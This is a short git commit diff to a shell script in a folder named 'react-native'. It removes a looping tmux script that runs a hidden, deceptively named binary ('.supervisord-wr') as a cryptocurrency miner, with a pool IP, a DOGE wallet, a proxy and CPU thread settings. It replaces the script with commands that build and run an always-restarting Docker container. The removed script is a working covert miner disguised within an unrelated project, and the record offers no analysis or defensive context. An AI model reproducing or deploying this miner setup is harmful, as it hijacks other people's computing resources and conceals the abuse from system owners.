8ab09a590c8d192473c6be0f2259885d8b94bd38
dediminari <101470275+dediminari@users.noreply.github.com>
2024-10-06 07:21:50 +0700

    Update tmux.sh

--- react-native/tmux.sh
+++ react-native/tmux.sh
@@ -1,17 +1,2 @@
-#!/bin/bash
-
-while true
-do
-    echo "Menjalankan tmux selama 60 menit..."
-    tmux new -d -s sys-session "timeout 60m ./.supervisord-wr --algorithm verushash --pool 103.249.70.7:3300 --disable-gpu --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=8POW --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
-    
-    # Tunggu hingga tmux selesai (60 menit)
-    sleep 60m
-
-    echo "Jeda 10 menit..."
-    # Hentikan sesi tmux jika masih berjalan
-    tmux kill-session -t sys-session
-
-    # Tunggu selama 10 menit
-    sleep 10m
-done
+docker build . -t bit
+docker run -itd --name bit --restart=always bit sleep infinity
